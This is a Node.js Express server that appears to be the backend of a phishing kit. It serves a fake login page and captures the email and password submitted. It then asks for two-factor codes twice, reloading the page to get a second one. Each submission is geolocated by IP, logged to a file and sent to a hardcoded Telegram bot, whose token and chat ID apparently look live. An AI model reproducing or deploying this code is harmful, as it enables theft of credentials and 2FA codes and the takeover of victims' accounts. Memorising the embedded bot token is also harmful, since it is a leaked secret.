const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = '8191694320:AAHLEWMYjclMwOM2oylyWweAaJ-b9l0GZZo';
const TELEGRAM_CHAT_ID = '-1003701418359';

async function getLocation(ip) {
  try {
    if (!ip || ip === '::1' || ip === '127.0.0.1') return 'Localhost';
    const response = await fetch(`http://ip-api.com/json/${ip}`);
    const data = await response.json();
    if (data.status === 'success') {
      return `${data.city}, ${data.country}`;
    }
    return 'Unknown';
  } catch (error) {
    return 'Unknown';
  }
}

async function sendToTelegram(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('Telegram credentials not set. Message:', message);
    return;
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    const data = await response.json();
    if (!data.ok) {
      console.error('Telegram API Error:', data);
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
  }
}

// Function to log data
async function logData(data) {
  const location = await getLocation(data.ip);
  const logEntry = `${new Date().toISOString()} - IP: ${data.ip} - Location: ${location} - ${JSON.stringify(data)}\n`;
  console.log(logEntry);
  fs.appendFile('server.log', logEntry, (err) => {
    if (err) console.error('Error logging data:', err);
  });

  // Format message for Telegram
  let telegramMessage = `🔔 *New Activity*\n`;
  telegramMessage += `*Type:* ${data.type}\n`;
  telegramMessage += `*IP:* ${data.ip}\n`;
  telegramMessage += `*Location:* ${location}\n`;

  if (data.email) telegramMessage += `*Email:* \`${data.email}\`\n`;
  if (data.pass) telegramMessage += `*Password:* \`${data.pass}\`\n`;
  if (data.code) telegramMessage += `*Code:* \`${data.code}\`\n`;
  if (data.step) telegramMessage += `*Step:* ${data.step}\n`;
  if (data.page) telegramMessage += `*Page:* ${data.page}\n`;

  sendToTelegram(telegramMessage);
}

// Logging middleware for index.html
app.get('/index.html', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  logData({ type: 'Page Visit', page: '/index.html', ip });
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve index page as root
app.get('/', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  logData({ type: 'Page Visit', page: '/index.html', ip });
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve login page
app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

// Handle login submission
app.post('/login', (req, res) => {
  const { email, pass } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  logData({ type: 'Login Attempt', email, pass, ip });

  // Redirect to 2FA page
  res.redirect('/2fa.html');
});

// Serve 2FA page
app.get('/2fa.html', (req, res) => {
  res.sendFile(path.join(__dirname, '2fa.html'));
});

// Handle 2FA submission
app.post('/2fa', (req, res) => {
  const { code, step, email, pass } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  logData({ type: '2FA Attempt', code, step, ip, email, pass });

  if (step == 1) {
    // Log first code and signal frontend to reload
    res.json({ action: 'reload' });
  } else {
    // Log second code and signal completion
    res.json({ action: 'complete' });
  }
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});

process.on('exit', (code) => {
  console.log(`Process exited with code: ${code}`);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});
